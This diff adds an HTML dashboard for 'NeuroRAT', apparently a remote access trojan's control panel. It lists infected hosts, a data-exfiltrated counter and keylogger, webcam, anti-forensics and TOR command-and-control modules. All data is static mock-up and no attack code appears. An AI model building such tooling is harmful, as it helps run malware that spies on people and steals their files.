@@ -1,0 +1,487 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>NeuroRAT - Dashboard</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.3/font/bootstrap-icons.css">
+    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+    <style>
+        body {
+            background-color: #1a1a1a;
+            color: #e0e0e0;
+        }
+        .navbar {
+            background-color: #000000;
+            border-bottom: 1px solid #333;
+        }
+        .card {
+            background-color: #222;
+            border: 1px solid #444;
+            margin-bottom: 20px;
+        }
+        .card-header {
+            background-color: #333;
+            color: #00ff00;
+            font-family: 'Courier New', monospace;
+        }
+        .status-indicator {
+            display: inline-block;
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            margin-right: 5px;
+        }
+        .status-active {
+            background-color: #28a745;
+            box-shadow: 0 0 5px #28a745;
+        }
+        .status-idle {
+            background-color: #ffc107;
+            box-shadow: 0 0 5px #ffc107;
+        }
+        .status-offline {
+            background-color: #dc3545;
+            box-shadow: 0 0 5px #dc3545;
+        }
+        .metric-value {
+            font-size: 24px;
+            font-weight: bold;
+            color: #17a2b8;
+        }
+        .metric-label {
+            font-size: 14px;
+            color: #adb5bd;
+        }
+        .agent-row:hover {
+            background-color: #2a2a2a;
+            cursor: pointer;
+        }
+        .system-status {
+            font-family: 'Courier New', monospace;
+            color: #00ff00;
+            background-color: #0a0a0a;
+            padding: 15px;
+            border-radius: 5px;
+            height: 250px;
+            overflow-y: auto;
+        }
+        .activity-feed {
+            height: 300px;
+            overflow-y: auto;
+        }
+        .activity-item {
+            border-left: 3px solid #17a2b8;
+            padding: 10px;
+            margin-bottom: 10px;
+            background-color: #2a2a2a;
+        }
+        .text-success {
+            color: #28a745 !important;
+        }
+        .text-warning {
+            color: #ffc107 !important;
+        }
+        .text-danger {
+            color: #dc3545 !important;
+        }
+    </style>
+</head>
+<body>
+    <nav class="navbar navbar-expand-lg navbar-dark">
+        <div class="container">
+            <a class="navbar-brand" href="/">NeuroRAT</a>
+            <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">
+                <span class="navbar-toggler-icon"></span>
+            </button>
+            <div class="collapse navbar-collapse" id="navbarNav">
+                <ul class="navbar-nav">
+                    <li class="nav-item">
+                        <a class="nav-link active" href="/">Dashboard</a>
+                    </li>
+                    <li class="nav-item">
+                        <a class="nav-link" href="/agents">Agents</a>
+                    </li>
+                    <li class="nav-item">
+                        <a class="nav-link" href="/tasks">Tasks</a>
+                    </li>
+                    <li class="nav-item">
+                        <a class="nav-link" href="/settings">Settings</a>
+                    </li>
+                </ul>
+                <div class="ms-auto d-flex align-items-center">
+                    <span class="me-3"><i class="bi bi-shield-lock-fill text-success me-1"></i> Secure Connection</span>
+                    <div class="dropdown">
+                        <button class="btn btn-outline-light dropdown-toggle" type="button" id="userMenu" data-bs-toggle="dropdown">
+                            <i class="bi bi-person-circle me-1"></i> Admin
+                        </button>
+                        <ul class="dropdown-menu dropdown-menu-dark">
+                            <li><a class="dropdown-item" href="#">Profile</a></li>
+                            <li><a class="dropdown-item" href="#">Settings</a></li>
+                            <li><hr class="dropdown-divider"></li>
+                            <li><a class="dropdown-item" href="#">Logout</a></li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </nav>
+
+    <div class="container mt-4">
+        <div class="row mb-4">
+            <div class="col-md-12">
+                <div class="card">
+                    <div class="card-header d-flex justify-content-between align-items-center">
+                        <h5><i class="bi bi-speedometer2 me-2"></i> System Overview</h5>
+                        <div>
+                            <span class="badge bg-success me-2">Server Online</span>
+                            <span class="badge bg-info">Version 1.2.3</span>
+                        </div>
+                    </div>
+                    <div class="card-body">
+                        <div class="row">
+                            <div class="col-md-3 text-center">
+                                <div class="metric-value">12</div>
+                                <div class="metric-label">ACTIVE AGENTS</div>
+                                <div class="progress mt-2" style="height: 5px;">
+                                    <div class="progress-bar bg-success" role="progressbar" style="width: 75%"></div>
+                                </div>
+                            </div>
+                            <div class="col-md-3 text-center">
+                                <div class="metric-value">156</div>
+                                <div class="metric-label">TASKS COMPLETED</div>
+                                <div class="progress mt-2" style="height: 5px;">
+                                    <div class="progress-bar bg-info" role="progressbar" style="width: 65%"></div>
+                                </div>
+                            </div>
+                            <div class="col-md-3 text-center">
+                                <div class="metric-value">43 GB</div>
+                                <div class="metric-label">DATA EXFILTRATED</div>
+                                <div class="progress mt-2" style="height: 5px;">
+                                    <div class="progress-bar bg-warning" role="progressbar" style="width: 45%"></div>
+                                </div>
+                            </div>
+                            <div class="col-md-3 text-center">
+                                <div class="metric-value">8</div>
+                                <div class="metric-label">PENDING TASKS</div>
+                                <div class="progress mt-2" style="height: 5px;">
+                                    <div class="progress-bar bg-danger" role="progressbar" style="width: 35%"></div>
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <div class="row mt-4">
+                            <div class="col-md-6">
+                                <h6>Agent Activity (24h)</h6>
+                                <canvas id="activityChart" height="200"></canvas>
+                            </div>
+                            <div class="col-md-6">
+                                <h6>System Resource Usage</h6>
+                                <canvas id="resourceChart" height="200"></canvas>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <div class="row">
+            <div class="col-md-8">
+                <div class="card">
+                    <div class="card-header d-flex justify-content-between align-items-center">
+                        <h5><i class="bi bi-pc-display me-2"></i> Active Agents</h5>
+                        <div>
+                            <button class="btn btn-sm btn-outline-primary me-2"><i class="bi bi-plus-circle"></i> Add Agent</button>
+                            <button class="btn btn-sm btn-outline-secondary"><i class="bi bi-arrow-repeat"></i> Refresh</button>
+                        </div>
+                    </div>
+                    <div class="card-body">
+                        <div class="table-responsive">
+                            <table class="table table-dark table-hover">
+                                <thead>
+                                    <tr>
+                                        <th>Status</th>
+                                        <th>Agent ID</th>
+                                        <th>OS</th>
+                                        <th>IP Address</th>
+                                        <th>User</th>
+                                        <th>Last Active</th>
+                                        <th>Actions</th>
+                                    </tr>
+                                </thead>
+                                <tbody>
+                                    <tr class="agent-row">
+                                        <td><span class="status-indicator status-active"></span> Active</td>
+                                        <td>agent_123</td>
+                                        <td>Windows 10</td>
+                                        <td>192.168.1.105</td>
+                                        <td>john.doe</td>
+                                        <td>2 mins ago</td>
+                                        <td>
+                                            <button class="btn btn-sm btn-outline-info"><i class="bi bi-terminal"></i></button>
+                                            <button class="btn btn-sm btn-outline-success"><i class="bi bi-file-earmark"></i></button>
+                                            <button class="btn btn-sm btn-outline-warning"><i class="bi bi-camera"></i></button>
+                                        </td>
+                                    </tr>
+                                    <tr class="agent-row">
+                                        <td><span class="status-indicator status-active"></span> Active</td>
+                                        <td>agent_456</td>
+                                        <td>Ubuntu 22.04</td>
+                                        <td>10.0.0.15</td>
+                                        <td>root</td>
+                                        <td>Just now</td>
+                                        <td>
+                                            <button class="btn btn-sm btn-outline-info"><i class="bi bi-terminal"></i></button>
+                                            <button class="btn btn-sm btn-outline-success"><i class="bi bi-file-earmark"></i></button>
+                                            <button class="btn btn-sm btn-outline-warning"><i class="bi bi-camera"></i></button>
+                                        </td>
+                                    </tr>
+                                    <tr class="agent-row">
+                                        <td><span class="status-indicator status-idle"></span> Idle</td>
+                                        <td>agent_789</td>
+                                        <td>macOS 13.2</td>
+                                        <td>172.16.0.5</td>
+                                        <td>sarah.admin</td>
+                                        <td>15 mins ago</td>
+                                        <td>
+                                            <button class="btn btn-sm btn-outline-info"><i class="bi bi-terminal"></i></button>
+                                            <button class="btn btn-sm btn-outline-success"><i class="bi bi-file-earmark"></i></button>
+                                            <button class="btn btn-sm btn-outline-warning"><i class="bi bi-camera"></i></button>
+                                        </td>
+                                    </tr>
+                                    <tr class="agent-row">
+                                        <td><span class="status-indicator status-offline"></span> Offline</td>
+                                        <td>agent_321</td>
+                                        <td>CentOS 8</td>
+                                        <td>192.168.10.45</td>
+                                        <td>admin</td>
+                                        <td>3 hours ago</td>
+                                        <td>
+                                            <button class="btn btn-sm btn-outline-info"><i class="bi bi-terminal"></i></button>
+                                            <button class="btn btn-sm btn-outline-success"><i class="bi bi-file-earmark"></i></button>
+                                            <button class="btn btn-sm btn-outline-warning"><i class="bi bi-camera"></i></button>
+                                        </td>
+                                    </tr>
+                                </tbody>
+                            </table>
+                        </div>
+                        <div class="d-flex justify-content-between align-items-center mt-3">
+                            <div>Showing 4 of 12 agents</div>
+                            <a href="/agents" class="btn btn-sm btn-outline-primary">View All Agents</a>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="col-md-4">
+                <div class="card mb-4">
+                    <div class="card-header">
+                        <h5><i class="bi bi-hdd-network me-2"></i> System Status</h5>
+                    </div>
+                    <div class="card-body">
+                        <div class="system-status">
+                            <div>[System] NeuroRAT v1.2.3 initialized</div>
+                            <div>[System] TOR service: <span class="text-success">ONLINE</span></div>
+                            <div>[System] Command & Control: <span class="text-success">ACTIVE</span></div>
+                            <div>[System] Database connection: <span class="text-success">OK</span></div>
+                            <div>[System] LLM service: <span class="text-success">ONLINE</span></div>
+                            <div>[System] File transfer service: <span class="text-success">READY</span></div>
+                            <div>[System] Keylogger module: <span class="text-success">READY</span></div>
+                            <div>[System] Screen capture module: <span class="text-success">READY</span></div>
+                            <div>[System] Audio capture module: <span class="text-warning">LIMITED</span></div>
+                            <div>[System] Webcam module: <span class="text-success">READY</span></div>
+                            <div>[System] Self-destruct module: <span class="text-success">READY</span></div>
+                            <div>[System] Anti-forensics module: <span class="text-success">ACTIVE</span></div>
+                            <div>[System] Last backup: 2023-08-15 03:15 UTC</div>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="card">
+                    <div class="card-header">
+                        <h5><i class="bi bi-activity me-2"></i> Recent Activity</h5>
+                    </div>
+                    <div class="card-body">
+                        <div class="activity-feed">
+                            <div class="activity-item">
+                                <div class="d-flex justify-content-between">
+                                    <strong>Task Completed</strong>
+                                    <small>2 mins ago</small>
+                                </div>
+                                <div>Agent agent_456 completed task #156: "Collect system information"</div>
+                            </div>
+                            <div class="activity-item">
+                                <div class="d-flex justify-content-between">
+                                    <strong>New Agent Connected</strong>
+                                    <small>15 mins ago</small>
+                                </div>
+                                <div>Agent agent_789 established first connection from 172.16.0.5</div>
+                            </div>
+                            <div class="activity-item">
+                                <div class="d-flex justify-content-between">
+                                    <strong>File Exfiltration</strong>
+                                    <small>30 mins ago</small>
+                                </div>
+                                <div>Agent agent_123 exfiltrated 5 files (25MB) from /Users/john.doe/Documents</div>
+                            </div>
+                            <div class="activity-item">
+                                <div class="d-flex justify-content-between">
+                                    <strong>Task Failed</strong>
+                                    <small>45 mins ago</small>
+                                </div>
+                                <div>Agent agent_321 failed to execute task #154: "Privilege escalation"</div>
+                            </div>
+                            <div class="activity-item">
+                                <div class="d-flex justify-content-between">
+                                    <strong>Agent Disconnected</strong>
+                                    <small>3 hours ago</small>
+                                </div>
+                                <div>Agent agent_321 disconnected unexpectedly</div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js"></script>
+    <script>
+        // Activity Chart
+        const activityCtx = document.getElementById('activityChart').getContext('2d');
+        const activityChart = new Chart(activityCtx, {
+            type: 'line',
+            data: {
+                labels: ['00:00', '03:00', '06:00', '09:00', '12:00', '15:00', '18:00', '21:00'],
+                datasets: [{
+                    label: 'Active Agents',
+                    data: [5, 3, 4, 6, 10, 12, 9, 8],
+                    borderColor: '#28a745',
+                    backgroundColor: 'rgba(40, 167, 69, 0.1)',
+                    tension: 0.4,
+                    fill: true
+                }, {
+                    label: 'Tasks Executed',
+                    data: [12, 8, 10, 15, 25, 30, 22, 18],
+                    borderColor: '#17a2b8',
+                    backgroundColor: 'rgba(23, 162, 184, 0.1)',
+                    tension: 0.4,
+                    fill: true
+                }]
+            },
+            options: {
+                responsive: true,
+                scales: {
+                    y: {
+                        beginAtZero: true,
+                        grid: {
+                            color: 'rgba(255, 255, 255, 0.1)'
+                        },
+                        ticks: {
+                            color: '#adb5bd'
+                        }
+                    },
+                    x: {
+                        grid: {
+                            color: 'rgba(255, 255, 255, 0.1)'
+                        },
+                        ticks: {
+                            color: '#adb5bd'
+                        }
+                    }
+                },
+                plugins: {
+                    legend: {
+                        labels: {
+                            color: '#e0e0e0'
+                        }
+                    }
+                }
+            }
+        });
+        
+        // Resource Chart
+        const resourceCtx = document.getElementById('resourceChart').getContext('2d');
+        const resourceChart = new Chart(resourceCtx, {
+            type: 'bar',
+            data: {
+                labels: ['CPU', 'Memory', 'Disk', 'Network'],
+                datasets: [{
+                    label: 'Current Usage (%)',
+                    data: [45, 65, 32, 58],
+                    backgroundColor: [
+                        'rgba(40, 167, 69, 0.6)',
+                        'rgba(23, 162, 184, 0.6)',
+                        'rgba(255, 193, 7, 0.6)',
+                        'rgba(220, 53, 69, 0.6)'
+                    ],
+                    borderColor: [
+                        'rgba(40, 167, 69, 1)',
+                        'rgba(23, 162, 184, 1)',
+                        'rgba(255, 193, 7, 1)',
+                        'rgba(220, 53, 69, 1)'
+                    ],
+                    borderWidth: 1
+                }]
+            },
+            options: {
+                responsive: true,
+                scales: {
+                    y: {
+                        beginAtZero: true,
+                        max: 100,
+                        grid: {
+                            color: 'rgba(255, 255, 255, 0.1)'
+                        },
+                        ticks: {
+                            color: '#adb5bd'
+                        }
+                    },
+                    x: {
+                        grid: {
+                            color: 'rgba(255, 255, 255, 0.1)'
+                        },
+                        ticks: {
+                            color: '#adb5bd'
+                        }
+                    }
+                },
+                plugins: {
+                    legend: {
+                        labels: {
+                            color: '#e0e0e0'
+                        }
+                    }
+                }
+            }
+        });
+        
+        // Simulate updating the system status console
+        setInterval(() => {
+            const systemStatus = document.querySelector('.system-status');
+            const now = new Date();
+            const timestamp = now.toTimeString().split(' ')[0];
+            const messages = [
+                `[System] Heartbeat received from agent_123 at ${timestamp}`,
+                `[System] Heartbeat received from agent_456 at ${timestamp}`,
+                `[System] Memory usage: ${Math.floor(Math.random() * 20) + 40}%`,
+                `[System] Network traffic: ${Math.floor(Math.random() * 100) + 150} KB/s`,
+                `[System] New task queued for agent_456`
+            ];
+            
+            const randomMessage = messages[Math.floor(Math.random() * messages.length)];
+            const messageElement = document.createElement('div');
+            messageElement.textContent = randomMessage;
+            systemStatus.appendChild(messageElement);
+            
+            systemStatus.scrollTop = systemStatus.scrollHeight;
+            
+            // Limit the number of messages
+            if (systemStatus.childNodes.length > 20) {
+                systemStatus.removeChild(systemStatus.firstChild);
+            }
+        }, 5000);
+    </script>
+</body>
+</html> 
